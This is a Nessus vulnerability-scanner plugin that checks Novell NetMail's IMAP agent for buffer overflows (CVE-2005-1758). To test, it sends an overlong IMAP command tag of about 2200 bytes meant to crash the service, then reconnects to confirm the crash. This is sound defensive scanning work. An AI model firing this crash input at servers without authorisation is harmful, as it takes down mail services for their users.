#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(18506);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2005-1758");
  script_bugtraq_id(13926, 14718);
  script_osvdb_id(17238, 17239);

  script_name(english:"Novell NetMail < 3.52C IMAP Agent Multiple Remote Overflows");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote IMAP server is affected by multiple buffer overflows." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Novell NetMail, a messaging and calendaring
system for Windows, Linux, Unix, and NetWare. 

The version of NetMail installed on the remote host is prone to
multiple buffer overflows in its IMAP agent, one when handling long
command tags, the other involving IMAP command continuations." );
 script_set_attribute(attribute:"see_also", value:"http://support.novell.com/cgi-bin/search/searchtid.cgi?/10097957.htm" );
 script_set_attribute(attribute:"see_also", value:"http://support.novell.com/filefinder/19357/index.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to NetMail version 3.52C or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/06/17");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/06/06");
 script_set_attribute(attribute:"patch_publication_date", value: "2005/06/13");
 script_cvs_date("$Date: 2016/11/23 20:31:34 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  script_summary(english:"Checks for multiple buffer overflows in Novell NetMail's IMAP agent");
  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");
  script_family(english:"Gain a shell remotely");
  script_dependencies("find_service1.nasl", "imap_overflow.nasl");
  script_exclude_keys("imap/false_imap", "imap/overflow");
  script_require_ports("Services/imap", 143);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("imap_func.inc");


# Check the imap server.
port = get_service(svc:"imap", default: 143, exit_on_fail: 1);
if (get_kb_item("imap/"+port+"/false_imap")
 || get_kb_item("imap/"+port+"/overflow")) exit(0);


# If it's NetMail...
banner = get_imap_banner(port:port);
if ("NetMail IMAP4 Agent" >< banner) {
  # Try to exploit one of the buffer overflows.

  # Establish a connection.
  soc = open_sock_tcp(port);
  if (soc) {
    s = recv_line(socket:soc, length:1024);
    if (strlen(s)) {
      # An overly-long tag crashes a vulnerable imap daemon.
      #
      # nb: ~2200 seems to be the cutoff for whether it crashes or not.
      c = string(crap(2200), "1");
      send(socket:soc, data:string(c, "\r\n"));
      s = recv_line(socket:soc, length:1024);

      # If we get a response, it's not vulnerable.
      if (s) {
        c = string("a1 LOGOUT");
        send(socket:soc, data:string(c, "\r\n"));
        s = recv_line(socket:soc, length:1024);
      }
      # Else let's make sure it's really down.
      else {
        sleep(1);
        # Try to reestablish a connection and read the banner.
        soc2 = open_sock_tcp(port);
        if (soc2) s2 = recv_line(socket:soc2, length:1024);

        # If we couldn't establish the connection or read the banner,
        # there's a problem.
        if (!soc2 || !strlen(s2)) {
          security_hole(port);
          exit(0);
        }
        close(soc2);
      }
    }
    close(soc);
  }
}
